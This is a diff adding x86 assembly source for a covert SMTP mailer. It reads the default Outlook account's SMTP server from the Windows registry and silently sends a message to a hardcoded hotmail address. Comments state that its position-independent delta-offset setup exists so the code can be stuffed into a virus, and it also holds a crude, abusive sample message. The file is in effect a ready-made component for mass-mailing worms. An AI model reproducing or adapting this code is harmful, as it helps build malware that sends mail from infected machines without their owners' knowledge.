@@ -1,0 +1,290 @@
+
+; SMTP client.
+; Sends an e-mail using the Outlook SMTP server specified in the registry.
+;
+
+                .386
+                .MODEL  FLAT
+                .DATA
+
+                JUMPS           ; So I don't have to mess around with JMPs.
+
+EXTRN           ExitProcess:PROC
+EXTRN           WSAStartup:PROC
+EXTRN           WSACleanup:PROC
+EXTRN           gethostbyname:PROC
+EXTRN           socket:PROC
+EXTRN           closesocket:PROC
+EXTRN           connect:PROC
+EXTRN           select:PROC
+EXTRN           recv:PROC
+EXTRN           send:PROC
+EXTRN           RegCloseKey:PROC
+EXTRN           RegQueryValueExA:PROC
+EXTRN           RegOpenKeyExA:PROC
+
+SOCK_STREAM             EQU     1       ; Stream socket.
+AF_INET                 EQU     2       ; Internetwork: UDP, TCP, etc.
+HKEY_CURRENT_USER       EQU     80000001h
+KEY_QUERY_VALUE         EQU     1
+REG_SZ                  EQU     1
+
+START:
+                CALL    Get_EIP                 ; Get delta offset, incase
+Get_EIP:        POP     EBP                     ; someone would want to stuff
+                SUB     EBP, (Get_EIP-START)    ; this in a virus.
+
+                XOR     EBX, EBX
+
+                LEA     EDI, [EBP+(Reg_Handle-START)]
+
+                LEA     EAX, [EBP+(Reg_Handle-START)]
+                PUSH    EAX
+                PUSH    KEY_QUERY_VALUE
+                PUSH    EBX
+                CALL    @1
+                DB      'Software\Microsoft\Internet Account Manager', 0
+@1:             PUSH    HKEY_CURRENT_USER
+                CALL    RegOpenKeyExA
+
+                CALL    @2
+                DD      9
+@2:             LEA     EAX, [EBP+(Account_Index-START)]
+                PUSH    EAX
+                PUSH    EBX
+                PUSH    EBX
+                CALL    @3
+                DB      'Default Mail Account', 0
+@3:             PUSH    DWORD PTR [EBP+(Reg_Handle-START)]
+                CALL    RegQueryValueExA
+
+                PUSH    DWORD PTR [EBP+(Reg_Handle-START)]
+                CALL    RegCloseKey
+
+                PUSH    OFFSET Reg_Handle
+                PUSH    KEY_QUERY_VALUE
+                PUSH    EBX
+                CALL    @4
+                DB      'Software\Microsoft\Internet Account Manager\Accounts\'
+Account_Index:  DB      '00000000', 0
+@4:             PUSH    HKEY_CURRENT_USER
+                CALL    RegOpenKeyExA
+
+                CALL    @5
+                DD      30
+@5:             LEA     EAX, [EBP+(SMTP_Name-START)]
+                PUSH    EAX
+                PUSH    EBX
+                PUSH    EBX
+                CALL    @6
+                DB      'SMTP Server', 0
+@6:             PUSH    DWORD PTR [EBP+(Reg_Handle-START)]
+                CALL    RegQueryValueExA
+
+                PUSH    DWORD PTR [EBP+(Reg_Handle-START)]
+                CALL    RegCloseKey
+
+                PUSH    OFFSET WSA_Data         ; Winsock data.
+                PUSH    0101h                   ; Version 1.1 (Win95+).
+                CALL    WSAStartup
+
+                OR      EAX, EAX                ; Error?
+                JNZ     Exit
+
+                ; Convert the DNS name to an IP address.
+
+                LEA     EAX, [EBP+(SMTP_Name-START)]
+                PUSH    EAX
+                CALL    gethostbyname
+
+                XCHG    ECX, EAX                ; Error?
+                JECXZ   Free_Winsock
+
+                MOV     ESI, [ECX+12]           ; Fetch IP address.
+                LODSD
+                PUSH    DWORD PTR [EAX]
+                POP     DWORD PTR [EBP+(Server_IP-START)]
+
+                PUSH    0                       ; Create a socket.
+                PUSH    SOCK_STREAM
+                PUSH    AF_INET
+                CALL    socket
+
+                MOV     [EBP+(Work_Socket-START)], EAX
+
+                INC     EAX                     ; Error?
+                JZ      Free_Winsock
+
+                PUSH    16              ; Size of connect structure.
+                CALL    @7              ; Connect structure.
+                DW      AF_INET         ; Family.
+                DB      0, 25           ; Port number.
+Server_IP       DD      0               ; IP of server.
+                DB      8 DUP(0)        ; Unused.
+@7:             PUSH    DWORD PTR [EBP+(Work_Socket-START)]
+                CALL    connect
+
+                INC     EAX             ; Error?
+                JZ      Close_Socket
+
+                LEA     ESI, [EBP+(Send_Table-START)]
+
+                MOV     BL, 6
+
+                ; Wait up to 5 seconds for incoming data,
+                ; or else close the connection. This is
+                ; done to prevent an endless block.
+
+Command_Loop:   XOR     EAX, EAX
+
+                CALL    @8      ; Time-out:
+Time_Out:       DD      5       ; - Seconds.
+                DD      0       ; - Milliseconds.
+@8:             PUSH    EAX     ; Error (not used).
+                PUSH    EAX     ; Writeability (not used).
+                CALL    @9      ; Readability:
+Socket_Set:     DD      1       ; - Socket count.
+Work_Socket     DD      0       ; - Socket.
+@9:             PUSH    EAX     ; Unused.
+                CALL    select
+
+                DEC     EAX                     ; Socket can be read?
+                JNZ     Close_Socket            ; Else close up.
+
+                LEA     EDI, [EBP+(Buffer-START)]
+
+                PUSH    0                       ; Receive data from the
+                PUSH    512                     ; socket.
+                PUSH    EDI
+                PUSH    DWORD PTR [EBP+(Work_Socket-START)]
+                CALL    recv
+
+                XCHG    ECX, EAX                ; Connection closed?
+                JECXZ   Close_Socket
+
+                INC     ECX                     ; Error?
+                JZ      Close_Socket
+
+                OR      EBX, EBX                ; Received stuff was the QUIT
+                JZ      Close_Socket            ; reply? Then close up.
+
+                MOV     AL, '2'                 ; "OK" reply.
+
+                CMP     BL, 2                   ; Received stuff was the DATA
+                JNE     Check_Reply             ; reply?
+
+                INC     EAX                     ; "OK, send the rest" reply.
+
+Check_Reply:    SCASB                           ; Check for correct reply.
+                JE      Wait_Ready              ; Yep, so go on.
+
+                ; An error occurred, so we gracefully close down the
+                ; connection by sending a QUIT command to the server.
+
+                LEA     ESI, [EBP+(Send_Table-START)+(5*4)]
+
+                MOV     BL, 1
+
+                ; Poll if the socket can be written
+                ; to or bail after 5 seconds.
+
+Wait_Ready:     XOR     ECX, ECX
+
+                LEA     EAX, [EBP+(Time_Out-START)]
+                PUSH    EAX
+@10:            PUSH    ECX     ; Error (not used).
+                LEA     EAX, [EBP+(Socket_Set-START)]
+                PUSH    EAX     ; Writeability.
+@11:            PUSH    ECX     ; Readability (not used).
+                PUSH    ECX     ; Unused.
+                CALL    select
+
+                DEC     EAX                     ; Time-out?
+                JNZ     Close_Socket
+
+                CLD                             ; Fetch offset + size of next
+                LODSD                           ; SMTP command.
+
+                MOVZX   ECX, AX
+
+                SHR     EAX, 16
+                ADD     EAX, EBP                ; Add delta offset.
+
+                ; Send command/data to the socket.
+
+                PUSH    ECX
+
+                PUSH    0
+                PUSH    ECX                     ; Size of buffer.
+                PUSH    EAX                     ; Buffer.
+                PUSH    DWORD PTR [EBP+(Work_Socket-START)]
+                CALL    send
+
+                POP     ECX
+
+                CMP     EAX, ECX                ; All bytes were sent?
+                JNE     Close_Socket            ; Else close connection.
+
+                DEC     EBX                     ; Did all commands so far?
+                JNS     Command_Loop            ; If not, continue.
+
+Close_Socket:   PUSH    DWORD PTR [EBP+(Work_Socket-START)]
+                CALL    closesocket
+
+Free_Winsock:   CALL    WSACleanup
+
+Exit:           PUSH    0                       ; Back to Windoze.
+                CALL    ExitProcess
+
+Send_Table:     DW      (esHELO-sHELO), (sHELO-START)
+                DW      (esMAIL-sMAIL), (sMAIL-START)
+                DW      (esRCPT-sRCPT), (sRCPT-START)
+                DW      (esDATA-sDATA), (sDATA-START)
+                DW      (End_Body-Body), (Body-START)
+                DW      (esQUIT-sQUIT), (sQUIT-START)
+
+                ; Identify us to the server, keep in mind that
+                ; some servers check if this host is correct.
+
+sHELO           DB      'HELO host.name.of.sender', 0Dh, 0Ah
+esHELO:
+
+; This is the addy the mail gets returned to when it can't be delivered.
+; If you don't want to get notified of failures, use a blank addy ('<>').
+
+sMAIL           DB      'MAIL FROM:<T2000_@hotmail.com>', 0Dh, 0Ah
+esMAIL:
+
+                ; To whom the mail should be delivered.
+
+sRCPT           DB      'RCPT TO:<T2000_@hotmail.com>', 0Dh, 0Ah
+esRCPT:
+
+sDATA           DB      'DATA', 0Dh, 0Ah
+esDATA:
+
+                ; Header of the body.
+
+Body:           DB      'From: "Ben Dover" <bendover@crapmail.com>', 0Dh, 0Ah
+                DB      'Subject: Fuck You', 0Dh, 0Ah
+                DB      0Dh, 0Ah
+
+                ; Main body.
+
+                DB      'This is the body of the e-mail', 0Dh, 0Ah
+                DB      'bla bla bla die die bla bla', 0Dh, 0Ah
+
+                DB      '.', 0Dh, 0Ah           ; End of data command.
+End_Body:
+
+sQUIT           DB      'QUIT', 0Dh, 0Ah
+esQUIT:
+
+Reg_Handle      DD      0
+SMTP_Name       DB      30 DUP(0)
+WSA_Data        DB      400 DUP(0)
+Buffer          DB      512 DUP(0)
+
+                ; For more info consult RFC 821 (SMTP).
+
+                END     START
